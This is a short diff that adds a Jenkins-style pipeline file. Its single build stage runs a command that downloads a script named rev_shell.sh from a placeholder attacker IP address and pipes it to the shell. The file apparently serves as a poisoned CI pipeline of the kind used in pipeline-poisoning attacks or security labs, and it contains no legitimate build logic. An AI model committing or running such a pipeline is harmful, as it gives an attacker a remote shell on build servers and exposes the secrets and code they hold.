@@ -1,0 +1,12 @@
+pipeline {
+    agent any
+    stages {
+       stage('build') {
+          steps {
+              sh '''
+                    curl http://<attacker IP>:8000/rev_shell.sh | sh
+                '''                 
+              }             
+          }
+       }       
+    }
